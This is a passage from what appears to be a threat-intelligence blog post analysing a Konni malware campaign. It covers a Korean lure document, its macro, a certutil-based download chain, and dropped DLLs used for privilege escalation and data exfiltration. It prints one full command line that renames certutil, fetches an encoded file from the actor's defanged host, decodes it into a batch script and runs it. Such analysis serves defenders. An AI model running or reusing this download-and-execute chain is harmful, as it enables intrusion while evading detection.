3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*dooiijoRyJZnCoOZodqB0w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*dooiijoRyJZnCoOZodqB0w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*dooiijoRyJZnCoOZodqB0w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*dooiijoRyJZnCoOZodqB0w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*dooiijoRyJZnCoOZodqB0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*dooiijoRyJZnCoOZodqB0w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*dooiijoRyJZnCoOZodqB0w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="720" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Decoy document for 4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726</figcaption></figure><p id="d6b4" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">When analyzing the document, we see that the internal codepage of the lure document is 949 — ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout. This is an indication that the author is a Korean native speaker.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw qw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 1100w, https://miro.medium.com/v2/resize:fit:944/format:webp/1*QHL0IR8bu5Nv29Nvmjpnrw.png 944w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 472px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*QHL0IR8bu5Nv29Nvmjpnrw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*QHL0IR8bu5Nv29Nvmjpnrw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*QHL0IR8bu5Nv29Nvmjpnrw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*QHL0IR8bu5Nv29Nvmjpnrw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*QHL0IR8bu5Nv29Nvmjpnrw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*QHL0IR8bu5Nv29Nvmjpnrw.png 1100w, https://miro.medium.com/v2/resize:fit:944/1*QHL0IR8bu5Nv29Nvmjpnrw.png 944w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 472px"/><img alt="" class="bh md oi c" width="472" height="375" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Document Properties. Codepage 949 is windows Korean (Unified Hangul Code)</figcaption></figure><p id="b4b0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The lure document contains VBA macro code with the following capabilities:</p><ul class=""><li id="dfef" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">Changes the font color from light grey to black — to trick the victim to enable content.</li><li id="1231" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">Checks if windows is a 32 or 64 bit version.</li><li id="0da1" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">Constructs and executes the command-line to download additional files</li></ul><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rf"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XP34DwKziy5i2Indeaj1ig.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XP34DwKziy5i2Indeaj1ig.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XP34DwKziy5i2Indeaj1ig.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XP34DwKziy5i2Indeaj1ig.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XP34DwKziy5i2Indeaj1ig.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XP34DwKziy5i2Indeaj1ig.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XP34DwKziy5i2Indeaj1ig.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*XP34DwKziy5i2Indeaj1ig.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="353" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Macro code for 4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726</figcaption></figure><p id="feb7" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The document contains 3 hidden text boxes. Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rg"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jKI1-7t9R-7bFfPpH6CVeA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jKI1-7t9R-7bFfPpH6CVeA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jKI1-7t9R-7bFfPpH6CVeA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jKI1-7t9R-7bFfPpH6CVeA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jKI1-7t9R-7bFfPpH6CVeA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jKI1-7t9R-7bFfPpH6CVeA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jKI1-7t9R-7bFfPpH6CVeA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*jKI1-7t9R-7bFfPpH6CVeA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="265" loading="lazy" role="presentation"/></picture></div></div></figure><p id="946d" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Full Command Line example: <em class="on">c:\windows\system32\cmd.exe /q /c copy /y %windir%\system32\certutil.exe %temp%\mx.exe &amp;&amp; cd /d %temp% &amp;&amp; mx -urlcache -split -f </em><em class="on">http://handicap[.]eu5.org/1.txt</em><em class="on"> &amp;&amp; mx -decode -f 1.txt 1.bat &amp;&amp; del /f /q 1.txt &amp;&amp; 1.bat</em></p><p id="6eb2" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Certutil </strong>is a living-off the land command line utility that can be used to obtain certificate authority information and configure certificate services. Threat actors usually utilize certutil to download remote files from a given URL. It also incorporates a built-in function to decode base64-encoded files.</p><p id="fb5e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">CMD silently copies certutil.exe into temp directory and rename it to “mx.exe” in an attempt to evade detection and then downloads 1.txt from from a remote resource: <!-- -->http://handicap.eu5[.]org.<!-- --> The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.</p><p id="b52c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Opb3gqfa3GsgancSVE7cgg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Opb3gqfa3GsgancSVE7cgg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Opb3gqfa3GsgancSVE7cgg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Opb3gqfa3GsgancSVE7cgg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Opb3gqfa3GsgancSVE7cgg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Opb3gqfa3GsgancSVE7cgg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Opb3gqfa3GsgancSVE7cgg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Opb3gqfa3GsgancSVE7cgg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="187" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Konni Initial Execution</figcaption></figure></div></div></div><div class="ab cb po pp pq pr" role="separator"><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="6f52" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Stage 2 — Privilege Escalation</h2><p id="7413" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">The batch script acts as a second stage downloader and downloads two additional files, depending on the system architecture. Certutil is executed to download a txt file and decode its content. Decoding each base64 string (32-bit or 64-bit version) results in a cabinet file — setup.cab</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw ri"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 1100w, https://miro.medium.com/v2/resize:fit:1386/format:webp/1*75ds5VQj6SP3IBF0DR9WBQ.png 1386w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 693px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*75ds5VQj6SP3IBF0DR9WBQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*75ds5VQj6SP3IBF0DR9WBQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*75ds5VQj6SP3IBF0DR9WBQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*75ds5VQj6SP3IBF0DR9WBQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*75ds5VQj6SP3IBF0DR9WBQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*75ds5VQj6SP3IBF0DR9WBQ.png 1100w, https://miro.medium.com/v2/resize:fit:1386/1*75ds5VQj6SP3IBF0DR9WBQ.png 1386w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 693px"/><img alt="" class="bh md oi c" width="693" height="261" loading="eager" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">1.bat: downloads next stager</figcaption></figure><p id="19b4" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the system.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 1100w, https://miro.medium.com/v2/resize:fit:1056/format:webp/1*BeuNJT0ProaoE_9AmRptHQ.png 1056w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 528px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*BeuNJT0ProaoE_9AmRptHQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*BeuNJT0ProaoE_9AmRptHQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*BeuNJT0ProaoE_9AmRptHQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*BeuNJT0ProaoE_9AmRptHQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*BeuNJT0ProaoE_9AmRptHQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*BeuNJT0ProaoE_9AmRptHQ.png 1100w, https://miro.medium.com/v2/resize:fit:1056/1*BeuNJT0ProaoE_9AmRptHQ.png 1056w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 528px"/><img alt="" class="bh md oi c" width="528" height="98" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">setup.cab files</figcaption></figure><ul class=""><li id="66cc" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk"><strong class="my gv">Install.bat</strong> — acts as installer to ensure persistence and execute <strong class="my gv">mshlpsrvc.dll.</strong></li><li id="13bb" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><strong class="my gv">mshlpweb.dll</strong> — acts as loader; responsible to elevate privileges.</li><li id="4a69" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><strong class="my gv">mshlpsrvc.dll</strong> — final payload; responsible for data exfiltration.</li><li id="b9ca" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk"><strong class="my gv">mshlpsrvc.ini</strong> — configuration file; contains URL used by <strong class="my gv">mshlpsrvc.dll</strong></li></ul><p id="1d61" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Both dropped DLL files are unsigned and packed with UPX packer.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LDOYGx2XLMrpluXskH5Q7g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*LDOYGx2XLMrpluXskH5Q7g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*LDOYGx2XLMrpluXskH5Q7g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*LDOYGx2XLMrpluXskH5Q7g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*LDOYGx2XLMrpluXskH5Q7g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*LDOYGx2XLMrpluXskH5Q7g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*LDOYGx2XLMrpluXskH5Q7g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*LDOYGx2XLMrpluXskH5Q7g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="280" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">DLL file is unsigned &amp; UPX strings indicate file is packed</figcaption></figure><p id="1ed4" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">To check level of permissions, the threat actor uses net.exe. if the current user has high privileges, install.bat is executed directly. Otherwise, mshlpweb.dll is executed using rundll32.exe.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rl"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 1100w, https://miro.medium.com/v2/resize:fit:1002/format:webp/1*__iSzf4khXyuoND6-jSW3w.png 1002w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 501px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*__iSzf4khXyuoND6-jSW3w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*__iSzf4khXyuoND6-jSW3w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*__iSzf4khXyuoND6-jSW3w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*__iSzf4khXyuoND6-jSW3w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*__iSzf4khXyuoND6-jSW3w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*__iSzf4khXyuoND6-jSW3w.png 1100w, https://miro.medium.com/v2/resize:fit:1002/1*__iSzf4khXyuoND6-jSW3w.png 1002w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) 